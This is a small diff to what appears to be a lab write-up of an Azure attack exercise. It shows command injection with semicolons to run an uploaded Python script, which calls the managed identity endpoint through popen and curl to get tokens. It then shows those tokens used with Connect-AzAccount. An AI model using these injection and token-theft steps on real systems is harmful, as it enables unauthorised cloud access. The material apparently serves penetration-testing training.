@@ -471,6 +471,7 @@ a lot of the time the EndOfLine or Special Character is a ```;``` - so just put 
 ; ls /tmp/uploads/studentx;
 ; python /tmp/uploads/studentx/studentx.py;
 ```
+
 The python script is the same ```curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com``` with ```popen``` command we have performed previously:
 ```
 import os
@@ -507,7 +508,6 @@ ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
 ```
 
 Now we can connect with the returned Managed Identity tokens:
-
 ```
 $token = 'eyJ0eX..'
 $graphaccesstoken = 'eyJ0eX..' 
@@ -515,7 +515,7 @@ Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -Accou
 Get-AzResource
 ```
 
-```
+
 We are returned with this, which means our Managed Identity does not have rights to any resources:
 ```
 Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
